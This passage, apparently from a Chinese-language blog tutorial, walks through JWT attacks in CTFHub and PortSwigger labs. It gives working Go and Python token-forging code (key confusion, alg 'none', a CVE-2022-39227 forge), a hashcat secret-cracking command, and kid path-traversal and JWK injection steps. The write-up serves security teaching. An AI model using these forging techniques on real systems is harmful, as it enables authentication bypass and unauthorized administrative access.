double-quoted-string">"/privatekey.pem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$PUBLIC_KEY</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./publickey.pem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$FLAG</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$jwt_payload</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'role'</span><span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$jwt_payload</span><span class="token punctuation">,</span> <span class="token variable">$PRIVATE_KEY</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'RS256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$jwt_payload</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'role'</span><span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$jwt_payload</span><span class="token punctuation">,</span> <span class="token variable">$PRIVATE_KEY</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'RS256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        @<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"token"</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        @<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"token"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$PUBLIC_KEY</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$PUBLIC_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">-&gt;</span><span class="token property">role</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$FLAG</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221215172155.png"></p><p>可以看到公钥就在当前目录下</p><p>访问即可获得公钥</p><p><img src="/../../../../pic/Pasted%20image%2020221215184509.png"></p><p>当 <code>role</code> 字段为 <code>admin</code> 时会输出 flag</p><p><img src="/../../../../pic/Pasted%20image%2020221215184655.png"></p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>SecretKey <span class="token operator">=</span> <span class="token string">"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvWJslIJizvMRiYmlW7M5\nCB5PJrYSGtX2CKwwsdSwDTInoncCxnDD6B6kRk9trP7GuWPqBsxhVyKA1+Tx5pnl\nG4Z7yFpYUVASTl5PRAdUZKSGo0HedlbBRjO+sidXhNlm/uOTyMGeKlzy18oXqYqI\nJA/nkQaVk2GpiJZ6c5g/lZZCecFmg1Fm4J2QtKdzlfBxSH1o7aHzPyJdHhWZuMso\n/97zk+rhDCMnWKm+qlVd/Oz643Thc61A4weBWTXZje8St1njwTn4kaY47yyHM9/x\nR2/rvC35z/rwjEUl5QS+HS/+3OViTi8gCa6TNZZUcPfifAnwx0QVoJrRy7e4lKKH\nkQIDAQAB\n-----END PUBLIC KEY-----\n"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"role"</span><span class="token punctuation">:</span>     <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>SecretKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token: %v\n"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填入到 Cookie 中</p><p><img src="/../../../../pic/Pasted%20image%2020221215224030.png"></p><h3 id="3-3-空加密算法"><a href="#3-3-空加密算法" class="headerlink" title="3.3 空加密算法"></a>3.3 空加密算法</h3><p>题目链接 <a href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a></p><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none">有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>JWT支持使用空加密算法，可以在header中指定alg为none，此时只要把signature设置为空，提交到服务器，任何token都可以通过服务器的验证。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"role"</span><span class="token punctuation">:</span>     <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodNone<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SigningString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token: %v\n"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿着生成的去访问即可</p><p>题目链接 <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification</a></p><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none">This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.You can log in to your own account using the following credentials: wiener:peter <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用无签名的空加密算法绕过</p><p>登录之后返回一个 session</p><p><img src="/../../../../pic/Pasted%20image%2020221216100641.png"></p><p>解密之后其中 sub 为用户名</p><p><img src="/../../../../pic/Pasted%20image%2020221216100718.png"></p><p>构造一个空加密的 JWT</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"portswigger"</span><span class="token punctuation">,</span><span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"administrator"</span><span class="token punctuation">,</span><span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1671159986</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodNone<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SigningString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token: %v\n"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>带着生成的 Cookie 访问 <code>/admin</code></p><p><img src="/../../../../pic/Pasted%20image%2020221216101047.png"></p><p>将 carlos 用户删除即可</p><h3 id="3-4-爆破秘钥"><a href="#3-4-爆破秘钥" class="headerlink" title="3.4 爆破秘钥"></a>3.4 爆破秘钥</h3><p>这个的话其实就是使用工具来对密钥进行爆破，从而实现越权。这个的话在参考过其他师傅的文章后发现是有一些条件的，具体如下所示</p><pre class="line-numbers language-none"><code class="language-none">1、JWT使用的加密算法是HS256加密算法2、一段有效的、已签名的token3、签名用的密钥不复杂（弱密钥）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后这里还需要介绍一下爆破密钥用的工具，链接如下 <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a> 安装方式如下所示</p><pre class="line-numbers language-none"><code class="language-none">1、git&nbsp;clone&nbsp;https://github.com/brendan-rius/c-jwt-cracker&nbsp;#下载2、make&nbsp;#编译<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用方式如下</p><pre class="line-numbers language-none"><code class="language-none">./jwtcrack&nbsp;JWT&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 hashcat 进行暴力破解</p><p>题目连接 <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key</a></p><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none"> This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.You can log in to your own account using the following credentials: wiener:peter <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目中给出了<a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">字典链接</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat.exe  <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">16500</span> eyJraWQiOiJmNGYzMDg1NC00ZGVkLTQ3MzYtYTI3NC1mMjUxNjA0OGI0MjIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3MTE2MTIzMn0.b9ObKlI2JtlQOIo8ejG3Jli0b5PW9rJwpQw2kdkgVFA <span class="token punctuation">..</span><span class="token punctuation">\</span>jwt.secrets.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过爆破获得秘钥为 secret1 </p><p><img src="/../../../../pic/Pasted%20image%2020221216103416.png"></p><p>再生成一个 Payload</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>SecretKey <span class="token operator">=</span> <span class="token string">"secret1"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"portswigger"</span><span class="token punctuation">,</span><span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"administrator"</span><span class="token punctuation">,</span><span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1671159986</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>SecretKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token: %v\n"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-5-Kid-参数注入"><a href="#3-5-Kid-参数注入" class="headerlink" title="3.5 Kid 参数注入"></a>3.5 Kid 参数注入</h3><p>前文在简述Headers提到，它还有一个可选参数kid，当Headers中存在这个参数时，我们可以通过修改这个参数实现目录遍历、SQL注入等攻击</p><p>服务器可能会使用多个加密密钥来签署不同类型的数据，而不仅仅是 JWT。 因此，JWT 的标头可能包含 kid(Key ID) 参数，帮助服务器在验证签名时识别使用哪个密钥。</p><p>验证密钥通常存储为 JWK 集。 在这种情况下，服务器可能会简单地查找具有相同名称的 JWK kid作为令牌。 但是，JWS 规范并未为此 ID 定义具体结构——它只是开发人员选择的任意字符串。 例如，他们可能会使用 kid参数指向数据库中的特定条目，甚至是文件名。</p><p>如果此参数也容易受到 目录遍历 的影响，攻击者可能会强制服务器使用其文件系统中的任意文件作为验证密钥。 </p><pre class="line-numbers language-none"><code class="language-none">{    "kid": "../../path/to/file",    "typ": "JWT",    "alg": "HS256",    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果服务器还支持使用 对称算法 签名的 JWT，这尤其危险。 在这种情况下，攻击者可能会指出 kid参数添加到一个可预测的静态文件中，然后使用与该文件内容匹配的秘密对 JWT 进行签名。</p><p>理论上您可以对任何文件执行此操作，但最简单的方法之一是使用 /dev/null，它存在于大多数 Linux 系统上。 由于这是一个空文件，因此获取它会返回 null。 因此，使用 Base64 编码的空字节对令牌进行签名将产生有效的签名。 </p><p>题目链接 <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal</a></p><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none"> This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.You can log in to your own account using the following credentials: wiener:peter <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 Burp 的 JWT Editor 插件生成一个空的秘钥</p><p><img src="/../../../../pic/Pasted%20image%2020221216112621.png"></p><p>把其中的 k 的内容替换为 <code>AA==</code>（Base64 中的空）随后保存即可</p><p><img src="/../../../../pic/Pasted%20image%2020221216112657.png"></p><p>然后再抓包修改 JWT为图中内容最后再在 sing 中使用刚才生成出来的秘钥加密即可</p><p><img src="/../../../../pic/Pasted%20image%2020221216112730.png"></p><p>然后访问 <code>/admin/delete?username=carlos</code></p><p><img src="/../../../../pic/Pasted%20image%2020221216112842.png"></p><h3 id="3-6-JWK-注入攻击"><a href="#3-6-JWK-注入攻击" class="headerlink" title="3.6 JWK 注入攻击"></a>3.6 JWK 注入攻击</h3><p>JWK（JSON Web 密钥）是一种将密钥表示为 JSON 对象的标准化格式。 </p><p>您可以在以下 JWT 标头中看到这样的示例： </p><pre class="line-numbers language-none"><code class="language-none">{    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",    "typ": "JWT",    "alg": "RS256",    "jwk": {        "kty": "RSA",        "e": "AQAB",        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目链接：<a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection</a></p><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none"> This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.You can log in to your own account using the following credentials: wiener:peter <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先在 JWT Editor 生成一个 RSA Key</p><p><img src="/../../../../pic/Pasted%20image%2020221216185515.png"></p><p>然后修改 sub 以及使用刚才生成的 RSA KEY 进行</p><p><img src="/../../../../pic/Pasted%20image%2020221216185701.png"></p><p>然后发包</p><p><img src="/../../../../pic/Pasted%20image%2020221216185806.png"></p><h2 id="CVE-2022-39227"><a href="#CVE-2022-39227" class="headerlink" title="CVE-2022-39227"></a>CVE-2022-39227</h2><p>伪造 JWT 的脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedelta<span class="token keyword">from</span> json <span class="token keyword">import</span> loads<span class="token punctuation">,</span> dumps<span class="token keyword">from</span> jwcrypto<span class="token punctuation">.</span>common <span class="token keyword">import</span> base64url_decode<span class="token punctuation">,</span> base64url_encode<span class="token keyword">def</span> topic<span class="token punctuation">(</span>topic<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">""" Use mix of JSON and compact format to insert forged claims including long expiration """</span>    <span class="token punctuation">[</span>header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> signature<span class="token punctuation">]</span> <span class="token operator">=</span> topic<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token comment">#点分</span>    parsed_payload <span class="token operator">=</span> loads<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#解码</span>    parsed_payload<span class="token punctuation">[</span><span class="token string">'is_admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token comment">#伪造</span>    fake_payload <span class="token operator">=</span> base64url_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>dumps<span class="token punctuation">(</span>parsed_payload<span class="token punctuation">,</span> separators<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#编码</span>    <span class="token keyword">return</span> <span class="token string">'{"  '</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fake_payload <span class="token operator">+</span> <span class="token string">'.":"","protected":"'</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'", "payload":"'</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">'","signature":"'</span> <span class="token operator">+</span> signature <span class="token operator">+</span> <span class="token string">'"}'</span><span class="token comment">#生成恶意载荷</span>token <span class="token operator">=</span> topic<span class="token punctuation">(</span><span class="token string">'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMzcwMzAsImlhdCI6MTY2NzEzNjczMCwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJ4YWxlR2dadl9BbDBRd1ZLLUgxb0p3IiwibmJmIjoxNjY3MTM2NzMwLCJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiMTIzIn0.YnE5tK1noCJjultwUN0L1nwT8RnaU0XjYi5iio2EgbY7HtGNkSy_pOsnRl37Y5RJvdfdfWTDCzDdiz2B6Ehb1st5Fa35p2d99wzH4GzqfWfH5zfFer0HkQ3mIPnLi_9zFiZ4mQCOLJO9RBL4lD5zHVTJxEDrESlbaAbVOMqPRBf0Z8mon1PjP8UIBfDd4RDlIl9wthO-NlNaAUp45woswLe9YfRAQxN47qrLPje7qNnHVJczvvxR4-zlW0W7ahmYwODfS-KFp8AC80xgMCnrCbSR0_Iy1nsiCEO8w2y3BEcqvflOOVt_lazJv34M5e28q0czbLXAETSzpvW4lVSr7g'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a 